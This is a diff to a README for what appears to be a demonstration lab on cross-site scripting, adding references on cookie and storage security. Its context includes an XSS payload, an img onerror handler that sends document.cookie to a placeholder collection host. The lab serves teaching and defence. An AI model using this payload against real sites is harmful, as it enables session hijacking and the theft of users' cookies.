@@ -14,7 +14,6 @@ Run the following command to run the Nginx. Docker compose is located in the web
 docker-compose up
 ```
 
-
 ## Sample of XSS attack
 Inject the sample code below to see how the XSS attack works
 
@@ -27,3 +26,10 @@ Inject the sample code below to see how the XSS attack works
 ```html
 <img src=x onerror=this.onerror=null;this.src='http://your-domain/gateway/api/cookie/collect.gif?cookie='+document.cookie />
 ```
+
+## Reference
+
+- [Web Application Security](https://www.nginx.com/resources/library/web-application-security/)
+- [Mozilla - Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
+- [SameSite cookies explained](https://web.dev/samesite-cookies-explained/)
+- [Please Stop Using Local Storage](https://dev.to/rdegges/please-stop-using-local-storage-1i04)
